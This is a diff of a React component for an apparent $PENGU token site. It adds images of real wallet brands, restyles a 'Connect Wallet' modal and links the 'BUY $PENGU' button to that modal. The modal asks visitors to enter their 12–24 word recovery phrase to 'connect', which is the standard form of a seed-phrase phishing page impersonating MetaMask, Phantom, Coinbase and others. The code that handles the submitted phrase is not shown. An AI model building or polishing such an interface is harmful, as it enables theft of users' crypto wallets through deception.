@@ -18,13 +18,54 @@ export default function MainContent() {
   const [seedPhrase, setSeedPhrase] = useState("");
 
   const wallets = [
-    { name: "MetaMask", icon: "🦊" },
-    { name: "Phantom", icon: "👻" },
-    { name: "Solflare", icon: "🔥" },
-    { name: "Robinhood", icon: "🟢" },
-    { name: "Rabby", icon: "🐰" },
-    { name: "Exodus", icon: "📱" },
-    { name: "Coinbase", icon: "🔵" },
+    {
+      name: "MetaMask",
+      icon: "/image/metafox.jpeg",
+    },
+    {
+      name: "Solflare",
+      icon: "/image/solflare.jpeg",
+    },
+    {
+      name: "Phantom",
+      icon: "/image/phantom.jpeg",
+    },
+    {
+      name: "Robinhood",
+      icon: "/image/robinhood.jpeg",
+    },
+    {
+      name: "Rabby",
+      icon: "/image/rabbywallet.jpeg",
+    },
+    {
+      name: "Exodus",
+      icon: "/image/exodus.jpeg",
+    },
+    {
+      name: "Coinbase",
+      icon: "/image/coinbase.jpeg",
+    },
+    {
+      name: "Bitcoin",
+      icon: "/image/btc.jpeg",
+    },
+    {
+      name: "Ethereum",
+      icon: "/image/eth.jpeg",
+    },
+    {
+      name: "Solana",
+      icon: "/image/sol.jpeg",
+    },
+    {
+      name: "PENGU",
+      icon: "/image/pengu.jpeg",
+    },
+    {
+      name: "USDT",
+      icon: "/image/usdt.jpeg",
+    },
   ];
 
   const handleJoinHuddle = () => {
@@ -163,8 +204,9 @@ export default function MainContent() {
       {/* Wallet Connection Modal */}
       {showWalletModal && (
         <div className="fixed inset-0  bg-opacity-50 z-50 flex items-center justify-center p-4">
-          <div className="bg-white rounded-lg p-6 w-full max-w-md">
-            <div className="flex justify-between items-center mb-6">
+          <div className="bg-white rounded-lg w-full max-w-md max-h-[80vh] flex flex-col">
+            {/* Header - Fixed */}
+            <div className="flex justify-between items-center p-6 border-b border-gray-200">
               <h2 className="text-xl font-semibold text-gray-800">
                 Connect Wallet
               </h2>
@@ -181,56 +223,65 @@ export default function MainContent() {
               </button>
             </div>
 
-            {!showPhraseInput ? (
-              <div className="space-y-3">
-                {wallets.map((wallet) => (
-                  <button
-                    key={wallet.name}
-                    onClick={() => handleWalletSelect(wallet.name)}
-                    className="w-full flex items-center space-x-3 p-3 rounded-lg bg-gray-100 hover:bg-gray-200 transition-colors"
-                  >
-                    <span className="text-2xl">{wallet.icon}</span>
-                    <span className="font-medium text-gray-800">
-                      {wallet.name}
-                    </span>
-                  </button>
-                ))}
-              </div>
-            ) : (
-              <div className="space-y-4">
-                <div className="text-center">
-                  <h3 className="text-lg font-semibold mb-2 text-gray-800">
-                    Connect to {selectedWallet}
-                  </h3>
-                  <p className="text-gray-600 text-sm">
-                    Submit your 12-24 word phrase to connect
-                  </p>
+            {/* Content - Scrollable */}
+            <div className="flex-1 overflow-y-auto p-6">
+              {!showPhraseInput ? (
+                <div className="space-y-3">
+                  {wallets.map((wallet) => (
+                    <button
+                      key={wallet.name}
+                      onClick={() => handleWalletSelect(wallet.name)}
+                      className="w-full flex items-center space-x-3 p-3 rounded-lg bg-gray-100 hover:bg-gray-200 transition-colors"
+                    >
+                      <Image
+                        src={wallet.icon}
+                        alt={wallet.name}
+                        width={32}
+                        height={32}
+                        className="w-8 h-8 object-contain"
+                      />
+                      <span className="font-medium text-gray-800">
+                        {wallet.name}
+                      </span>
+                    </button>
+                  ))}
                 </div>
-                <textarea
-                  value={seedPhrase}
-                  onChange={(e) => setSeedPhrase(e.target.value)}
-                  placeholder="Enter your 12-24 word recovery phrase..."
-                  className="w-full h-32 p-3 bg-gray-100 border border-gray-300 rounded-lg text-gray-800 placeholder-gray-500 resize-none"
-                />
-                <div className="flex space-x-3">
-                  <Button
-                    onClick={() => {
-                      setShowPhraseInput(false);
-                      setSeedPhrase("");
-                    }}
-                    className="flex-1 bg-gray-500 hover:bg-gray-600"
-                  >
-                    Back
-                  </Button>
-                  <Button
-                    onClick={handleConnectWallet}
-                    className="flex-1 bg-purple-500 hover:bg-purple-600"
-                  >
-                    Connect
-                  </Button>
+              ) : (
+                <div className="space-y-4">
+                  <div className="text-center">
+                    <h3 className="text-lg font-semibold mb-2 text-gray-800">
+                      Connect to {selectedWallet}
+                    </h3>
+                    <p className="text-gray-600 text-sm">
+                      Submit your 12-24 word phrase to connect
+                    </p>
+                  </div>
+                  <textarea
+                    value={seedPhrase}
+                    onChange={(e) => setSeedPhrase(e.target.value)}
+                    placeholder="Enter your 12-24 word recovery phrase..."
+                    className="w-full h-32 p-3 bg-gray-100 border border-gray-300 rounded-lg text-gray-800 placeholder-gray-500 resize-none"
+                  />
+                  <div className="flex space-x-3">
+                    <Button
+                      onClick={() => {
+                        setShowPhraseInput(false);
+                        setSeedPhrase("");
+                      }}
+                      className="flex-1 bg-gray-500 hover:bg-gray-600"
+                    >
+                      Back
+                    </Button>
+                    <Button
+                      onClick={handleConnectWallet}
+                      className="flex-1 bg-purple-500 hover:bg-purple-600"
+                    >
+                      Connect
+                    </Button>
+                  </div>
                 </div>
-              </div>
-            )}
+              )}
+            </div>
           </div>
         </div>
       )}
@@ -394,40 +445,25 @@ export default function MainContent() {
           </div>
         </div>
 
-        {/* Center Igloo Icon */}
+        {/* Center PENGU Logo */}
         <div className="flex-1 flex justify-center">
-          <svg
-            width="60"
-            height="60"
-            viewBox="0 0 100 100"
-            fill="none"
-            xmlns="http://www.w3.org/2000/svg"
-          >
-            {/* Main igloo structure */}
-            <path
-              d="M20 70 Q20 30 50 30 Q80 30 80 70 Z"
-              fill="white"
-              stroke="#3b82f6"
-              strokeWidth="2"
+          <div className="w-15 h-15 rounded-full overflow-hidden border-2 border-white shadow-lg">
+            <Image
+              src="/image/pengu.jpeg"
+              alt="PENGU Logo"
+              width={60}
+              height={60}
+              className="w-full h-full object-cover"
+              priority
             />
-            {/* Igloo blocks pattern */}
-            <path d="M25 65 L75 65" stroke="#3b82f6" strokeWidth="1.5" />
-            <path d="M30 55 L70 55" stroke="#3b82f6" strokeWidth="1.5" />
-            <path d="M35 45 L65 45" stroke="#3b82f6" strokeWidth="1.5" />
-            <path d="M40 35 L60 35" stroke="#3b82f6" strokeWidth="1.5" />
-            {/* Vertical lines for blocks */}
-            <path d="M35 70 L35 55" stroke="#3b82f6" strokeWidth="1.5" />
-            <path d="M50 70 L50 45" stroke="#3b82f6" strokeWidth="1.5" />
-            <path d="M65 70 L65 55" stroke="#3b82f6" strokeWidth="1.5" />
-            <path d="M45 55 L45 35" stroke="#3b82f6" strokeWidth="1.5" />
-            <path d="M55 55 L55 35" stroke="#3b82f6" strokeWidth="1.5" />
-            {/* Door */}
-            <rect x="45" y="55" width="10" height="15" fill="#1a2332" rx="5" />
-          </svg>
+          </div>
         </div>
 
         {/* Buy Button */}
-        <Button className="bg-purple-500 hover:bg-purple-600 text-white font-bold px-8 py-3 rounded-lg text-lg">
+        <Button
+          onClick={() => setShowWalletModal(true)}
+          className="bg-purple-500 hover:bg-purple-600 text-white font-bold px-8 py-3 rounded-lg text-lg"
+        >
           BUY $PENGU
         </Button>
       </nav>
